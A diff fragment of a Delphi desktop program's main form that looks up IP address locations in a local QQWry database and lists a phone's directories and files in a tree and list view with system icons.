+procedure TfMain.FormDestroy(Sender: TObject);
+begin
+  jpg.Free;
+  stream.Free;
+end;
+
+//------------------------------------------------------------------------------------
+procedure tfmain.ShowIPAddr(IP:string);
+//http://www.cz88.net/ip/
+//纯真ip数据库 v2019.10.25
+begin
+  if IP='' then
+  begin
+    if FileExists(uConfig.QQWryFile) then begin
+      QQWry:=TQQWry.Create(QQWryFile);
+      MemoPhoneInf.Lines.Add('-----数据库-------');
+      MemoPhoneInf.Lines.Add('文件大小: ' + IntToStr(QQWry.GetQQWryFileSize));
+      MemoPhoneInf.Lines.Add('记录总数: ' + IntToStr(QQWry.GetIPRecordNum));
+      MemoPhoneInf.Lines.Add('更新日期: ' +QQWry.GetQQWryDate);
+      MemoPhoneInf.Lines.Add('数据库来源: ' + QQWry.GetQQWryDataFrom);
+      QQWry.Free;
+    end
+    else begin
+      QQWryFile:='';
+    end; //if FileExists(QQWryFile) then begin
+  end
+  else begin
+    if QQWryFile<>'' then
+    begin
+      QQWry:=TQQWry.Create(QQWryFile);
+      MemoPhoneInf.Lines.Add('IP: '+IP+
+        ' 国家: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[2] +
+        ' 地区: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[3]);
+      {
+      MemoPCInfo.Lines.Add('记录ID: ' + IntToStr(QQWry.GetIPRecordID(IP)) +
+                    ' IP范围: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[0] + ' - ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[1] +
+                    ' 国家: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[2] +
+                    ' 地区: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[3]);
+      }
+      QQWry.Free;
+    end;//if QQWryFile<>'' then
+  end;//
+end;
+
+function tfmain.getRootDir(rootDir:string):DWORD;
+begin
+  if(rootDir='SD卡')then result:=FILE_DIR_EX_SD;
+  if(rootDir='相册')then result:=FILE_DIR_PHOTO;
+  if(rootDir='/')then result:=FILE_DIR_ROOT;
+end;
+function tfmain.getListFile(node:ttreenode;item:tlistItem):TPhoneFileName;
+var
+  treeDir,fName,tmp:ansiString;
+  PhoneFileName:TPhoneFileName;
+  phoneDir:tphoneDir;
+begin
+  treeDir:=getTreeDir(node,phoneDir);
+  fName:=item.Caption;
+  if(ansiStrings.strlen(phoneDir.subDir)>0)then
+    tmp:=phoneDir.subDir+'/'+fName
+  else
+    tmp:=fName;
+  PhoneFileName.iRootDir:=phoneDir.iRootDir;
+  PhoneFileName.filename:=tmp;
+  result:=PhoneFileName;
+end;
+function tfmain.GetTreeDir(node:ttreenode;var phoneDir:TPhoneDir):ansistring;
+var
+  parentNode,rootNode:ttreenode;
+  path,rootPath:ansiString;
+  i:integer;
+begin
+  parentNode:=node;
+  path:=ansistring(node.text);
+  rootNode:=ParentNode;
+  while parentnode.parent<>nil do
+  begin
+    path:=ansistring(parentnode.Parent.Text)+'/'+path;
+    ParentNode:=parentnode.Parent;
+    rootNode:=ParentNode;
+  end;
+  i:=ansipos('/',path);
+  if(i>0)then
+  begin
+    rootPath:=ansistring(rootNode.Text);
+    path:=ansistrings.AnsiRightStr(path,length(path)-i-1);
+    //delete(path,1,pos('/',path));
+    if(rootPath='/')then  delete(path,1,ansipos('/',path));
+  end else begin
+    rootPath:=path;
+    path:='';
+  end;
+  phoneDir.iRootDir:=GetRootDir(rootPath);
+  phoneDir.subDir:=pansiChar(path);
+  result:=path;
+end;
+
+procedure tfmain.ProcessGetFileInfos(FileInfos:pointer;size:integer);
+label 1;
+var
+  Files:array of TPhoneFileInfo;
+  filename:pansiChar;
+  count,i:integer;
+  node:ttreenode;
+  item:tListitem;
+  localFileTime:tFileTime;
+  sysTime:tSystemTime;
+begin
+  if size=0 then goto 1;
+  count:=size div sizeof(tFileInfo);
+  setlength(Files,count);
+  copymemory(Files,FileInfos,size);
+  node:=treedir.Selected;
+  node.DeleteChildren;
+  listFiles.Clear;
+  for i:=0 to count-1 do
+  begin
+    fileName:=Files[i].cFileName;
+    if Files[i].nFileSizeLow=-1 then
+    begin
+      node:=treeDir.Items.AddChild(treeDir.Selected,fileName);
+      node.ImageIndex:=6;
+      node.SelectedIndex:=7;
+      node.StateIndex:=6;
+    end//目录
+    else begin
+      item:=listFiles.Items.Add;
+      item.Caption:=fileName;
+      item.ImageIndex:=getFileiconIndex(fileName,false);
+      item.SubItems.Add(inttostr(Files[i].nFileSizeLow));
+      item.SubItems.Add(Files[i].ftLastWriteTime);
+      //item.SubItems.Add(FileTimeToStr(Files[i].mTime));
+      //item.SubItems.Add(FileTimeToStr(Files[i].mTime));
+    end; //file
+  end;//for
+  node:=treeDir.Selected;
+  Node.AlphaSort;
+1:
+  Screen. Cursor := crDefault;
+  bar1.Panels[2].Text:='文件数：'+inttostr(listFiles.Items.count)+'.';
+end;
+//---------------------------------------------------------------------------------------------------------------
+function tfmain.GetFileIconIndex(FileName: string; Large: Boolean): Integer;
+{ 获取图标的序号函数 }
+var
+  Ext: string;
+  Flags: Integer;
+  FileInfo:TSHFileInfoA ;
+  tmpstr:string;
+begin
+  Ext := FileName;
+  Flags := SHGFI_SYSICONINDEX or SHGFI_TYPENAME or SHGFI_USEFILEATTRIBUTES;
+  if Large then
+    Flags := Flags or SHGFI_LARGEICON
+  else
+    Flags := Flags or SHGFI_SMALLICON;
+  SHGetFileInfoA(PansiChar(Ext), 0, FileInfo, SizeOf(FileInfo), Flags);
+  Result := FileInfo.iIcon;
+  tmpstr:=FileInfo.szDisplayName;
+  tmpstr:=FileInfo.szTypeName;
+  //FileInfo.
+  //self.Caption:=FileInfo.szTypeName;
+end;
+
+end.
